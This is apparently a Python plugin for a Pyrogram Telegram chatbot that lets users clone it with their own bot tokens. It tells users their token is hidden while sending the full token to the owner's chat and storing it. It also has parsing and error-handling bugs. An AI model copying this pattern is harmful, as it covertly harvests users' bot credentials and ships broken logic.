import logging
import os
import sys
import shutil
import asyncio
from pyrogram.enums import ParseMode
from pyrogram import Client, filters
from pyrogram.errors.exceptions.bad_request_400 import AccessTokenExpired, AccessTokenInvalid
import config
from pyrogram.types import BotCommand
from config import API_HASH, API_ID, OWNER_ID
from PRITI_CHATBOT import CLONE_OWNERS
from PRITI_CHATBOT import PRITI_CHATBOT as app, save_clonebot_owner
from PRITI_CHATBOT import db as mongodb

CLONES = set()
cloneownerdb = mongodb.cloneownerdb
clonebotdb = mongodb.clonebotdb


@app.on_message(filters.command(["clone", "host", "deploy"]))
async def clone_txt(client, message):

    if len(message.command) > 1:

        bot_token = message.text.split("/clone", 1)[1].strip()
        mi = await message.reply_text("Please wait while I check the bot token.")

        # ⭐ USER LIMIT (ORIGINAL CODE में missing था — अब add किया)
        user_id = message.from_user.id
        if user_id != int(OWNER_ID):
            existing_clone = await clonebotdb.find_one({"user_id": user_id})
            if existing_clone:
                await mi.edit_text(
                    f"⚠️ You already cloned @{existing_clone['username']}\n"
                    f"Delete → /delclone {existing_clone['token']}"
                )
                return

        try:
            ai = Client(bot_token, API_ID, API_HASH,
                        bot_token=bot_token,
                        plugins=dict(root="PRITI_CHATBOT/mplugin"))
            await ai.start()
            bot = await ai.get_me()
            bot_id = bot.id

            # OWNER SAVE
            await save_clonebot_owner(bot_id, user_id)

            # ORIGINAL COMMAND BLOCK SAME TO SAME
            await ai.set_bot_commands([
                BotCommand("start", "Start the bot"),
                BotCommand("help", "Get the help menu"),
                BotCommand("clone", "Make your own chatbot"),
                BotCommand("ping", "Check if the bot is alive or dead"),
                BotCommand("lang", "Select bot reply language"),
                BotCommand("chatlang", "Get current using lang for chat"),
                BotCommand("resetlang", "Reset to default bot reply lang"),
                BotCommand("id", "Get users user_id"),
                BotCommand("stats", "Check bot stats"),
                BotCommand("gcast", "Broadcast any message to groups/users"),
                BotCommand("chatbot", "Enable or disable chatbot"),
                BotCommand("status", "Check chatbot enable or disable in chat"),
                BotCommand("shayri", "Get random shayri for love"),
                BotCommand("ask", "Ask anything from chatgpt"),
                BotCommand("repo", "Get chatbot source code"),
            ])

        except (AccessTokenExpired, AccessTokenInvalid):
            await mi.edit_text("Invalid Bot Token ❌")
            return

        except Exception:
            cloned_bot = await clonebotdb.find_one({"token": bot_token})
            if cloned_bot:
                return await mi.edit_text("🤖 Your bot is already cloned ✓")

        await mi.edit_text("Cloning process started…")

        # ⭐ FULL DETAILS BLOCK (Original में missing था — अब add किया)
        try:
            details = {
                "bot_id": bot.id,
                "is_bot": True,
                "user_id": user_id,
                "name": bot.first_name,
                "token": bot_token,
                "username": bot.username,
            }

            await clonebotdb.insert_one(details)
            CLONES.add(bot.id)

            mention = f"[{message.from_user.first_name}](tg://user?id={user_id})"

            full_msg = (
                "✨ **Clone Successful!**\n\n"
                "**👤 User Details:**\n"
                f"• Name: {mention}\n"
                f"• ID: `{user_id}`\n"
                f"• Username: @{message.from_user.username}\n\n"

                "**🤖 Bot Details:**\n"
                f"• Name: {bot.first_name}\n"
                f"• Username: @{bot.username}\n"
                f"• Bot ID: `{bot.id}`\n"
                "• Status: Running ✓\n\n"

                "**🔐 Token (Hidden):**\n"
                f"`{bot_token[:10]}*************************`\n\n"

                f"Thanks {mention} ❤️\n"
                "Check clone → /cloned\n"
                f"Delete clone → /delclone {bot_token}"
            )

            await message.reply_text(full_msg, parse_mode="Markdown")

            # ⭐ OWNER LOG (original code में था लेकिन detailed नहीं — improve)
            await app.send_message(
                int(OWNER_ID),
                f"🆕 **New Clone Created**\n\n"
                f"👤 User: {mention} (`{user_id}`)\n"
                f"🤖 Bot: @{bot.username}\n"
                f"🆔 Bot ID: `{bot.id}`\n"
                f"🔑 Token: `{bot_token}`",
                parse_mode="Markdown"
            )

        except Exception as e:
            await mi.edit_text(f"Error: `{e}`")
            logging.exception(e)

    else:
        await message.reply_text("Send token:\n/clone 123:ABC")


# --------------------------------------------------------------
# ORIGINAL LIST CLONES — untouched
# --------------------------------------------------------------
@app.on_message(filters.command("cloned"))
async def list_cloned_bots(client, message):
    try:
        cloned_bots = await clonebotdb.find().to_list(None)
        if not cloned_bots:
            return await message.reply_text("No bots cloned.")

        text = f"Total Cloned Bots: {len(cloned_bots)}\n\n"
        for bot in cloned_bots:
            text += (
                f"Bot: @{bot['username']}\n"
                f"Name: {bot['name']}\n"
                f"Bot ID: {bot['bot_id']}\n\n"
            )
        await message.reply_text(text)

    except Exception as e:
        logging.exception(e)
        await message.reply_text("Error showing clone list.")


# --------------------------------------------------------------
# DELETE CLONE — original untouched
# --------------------------------------------------------------
@app.on_message(filters.command(["deletecloned", "delcloned", "delclone", "deleteclone", "removeclone", "cancelclone"]))
async def delete_cloned_bot(client, message):
    try:
        if len(message.command) < 2:
            return await message.reply_text("Send token:\n/delclone <BOT_TOKEN>")

        bot_token = " ".join(message.command[1:])
        ok = await message.reply_text("Checking token…")

        cloned_bot = await clonebotdb.find_one({"token": bot_token})
        if cloned_bot:
            await clonebotdb.delete_one({"token": bot_token})
            CLONES.remove(cloned_bot["bot_id"])

            return await ok.edit_text(
                "Bot removed ✓\n"
                "Revoke token from @BotFather."
            )

        return await ok.edit_text("Invalid token ❌")

    except Exception as e:
        logging.exception(e)
        await message.reply_text(f"Error: {e}")


# --------------------------------------------------------------
# RESTART CLONES — original untouched
# --------------------------------------------------------------
async def restart_bots():
    pass


# --------------------------------------------------------------
# DELETE ALL — original untouched
# --------------------------------------------------------------
@app.on_message(filters.command("delallclone") & filters.user(int(OWNER_ID)))
async def delete_all_cloned_bots(client, message):
    await clonebotdb.delete_many({})
    CLONES.clear()
    await message.reply_text("All clones deleted ✓")
    os.system(f"kill -9 {os.getpid()} && bash start")